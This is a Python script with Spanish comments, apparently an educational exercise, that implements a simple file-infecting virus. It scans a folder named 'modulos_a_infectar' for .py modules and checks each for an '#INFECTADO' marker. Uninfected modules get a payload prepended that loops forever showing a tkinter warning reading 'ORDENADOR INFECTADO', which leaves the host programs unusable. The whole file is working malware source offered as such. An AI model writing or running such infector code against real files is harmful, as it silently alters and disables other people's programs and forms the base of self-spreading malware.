"""
un virus informático es un software/programa malicioso
que altera el funcionamiento normal de un programa ya existente

en este caso voy a alterar los programas de los modulos de la carpeta "modulos_a_infectar"

la idea es que a la hora de ejecutarlos salga un mensaje
de alerta que se repita constantemente y que informe que la máquina
ha sido infectada
"""

# glob: devuelve una lista con las entradas que coincidan con el patrón especificado en el nombre de ruta
# permite listar los modulos ubicados en la carpeta "modulos_a_infectar"
import glob

"""
dentro de la variable llamada "virus_string" creo bloque de codigo
importo libreria tkinter, con la que creo el cuadro de dialogo
creo una instancia de Tk para inicializar el intérprete tk y crear la ventana raíz (root)
con withdraw() escondo la ventana sin destruirla internamente
creo un bucle infinito donde se muestra el cuadro de dialogo 
mostrando un aviso (warning) cuyo titulo es "Hola ingenuo"
y cuyo mensaje es "ORDENADOR INFECTADO"
"""
virus_string = '''
import tkinter as tk
from tkinter import messagebox
root = tk.Tk()
root.withdraw()
while True:
    tk.messagebox.showwarning("Hola ingenuo", "ORDENADOR INFECTADO")
'''

#String que se escribira en los modulos infectados al ejecutar el virus (en forma de comentario para evitar errores)
infected_string = '#INFECTADO'
is_infected = False #en caso de que ya este infectado, sobretodo en posteriores ejecuciones
files = glob.glob('modulos_a_infectar/*.py') #listo todos los modulos de la carpeta con glob

for file in files: #para cada modulo existente en la carpeta
    f = open(file, 'r') #abro el modulo de lectura (r de read)
    code = f.readlines() #leo todas sus lineas de codigo
    f.close() #cierro el modulo
    for line in code: #para cada linea en el codigo
        if infected_string in line: #si el String "infected_string" esta presente en alguna linea
            #esta infectado es verdadero porque ha encontrado este String dentro del codigo
            #ya que lo que quiero hacer es meter ese String y el cuadro de mensaje en el programa
            is_infected = True
            break #se detiene el bucle

    if not is_infected: #si no esta infectado
        new_f = open(file, 'w') #creo modulo pero esta vez de escritura (w de write)
        # en el modulo escribo el string para detectar que esta infectado en casos futuros
        new_f.write(infected_string + '\n')
        new_f.write(virus_string) #escribo lo que es el virus en si, lo que hace que aparezca el cuadro de dialogo
        # escribo el codigo del modulo tal cual, para dejar el modulo igual pero con diferencia de que
        #nos despliega la alerta continuamente
        new_f.writelines(code)
        new_f.close() #cierro el modulo